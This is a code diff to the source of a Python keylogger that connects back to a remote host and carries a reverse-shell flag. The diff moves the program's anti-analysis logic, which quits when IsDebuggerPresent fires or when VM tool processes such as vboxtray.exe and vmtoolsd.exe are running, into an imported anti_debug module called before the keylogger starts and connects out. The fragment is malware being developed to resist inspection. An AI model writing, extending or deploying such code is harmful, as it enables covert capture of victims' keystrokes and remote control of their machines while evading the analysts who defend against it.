@@ -1,4 +1,5 @@
 # -*- coding: utf-8 -*-
+import anti_debug
 import ctypes
 import keyboard
 import logging
@@ -189,6 +190,12 @@ class Keylogger:
                 logging.debug(err)
                 self.connect_to_host()
 
+#--------------- Anti-Debug/VM -----------------#
+
+    def check_debug_vm(self):
+        if anti_debug.main():
+            exit()
+
 #--------------- POLLING METHODS ---------------#
     def check_foreground_window(self):
         while True:
@@ -209,19 +216,6 @@ class Keylogger:
 
             time.sleep(self.window_interval)
 
-
-#--------------- Anti-analysis-techniques----------#
-    def anti_debug(self):
-        debugger_is_present = ctypes.windll.kernel32.IsDebuggerPresent()
-        if debugger_is_present:
-            self.stop()
-
-    def anti_vm(self):
-        vm_exe = ["vmsrvc.exe" , "vmusrvc.exe", "vboxtray.exe", "vmtoolsd.exe", "df5serv.exe", "vboxservice.exe"]
-        for process in psutil.process_iter():
-            for i in vm_exe:
-                if i in process.name().lower():
-                    self.stop()
 
 #--------------- START / STOP ---------------#
     def activate(self):
@@ -275,8 +269,7 @@ def execute_command(command:str) -> str:
 if __name__ == "__main__":
     reverse_shell_active = False
     keylogger = Keylogger(log_interval=15, window_interval=0.25, reconnect_interval=5)
-    keylogger.anti_debug()
-    keylogger.anti_vm()
+    keylogger.check_debug_vm()
     keylogger.start()
     keylogger.connect_to_host()
 
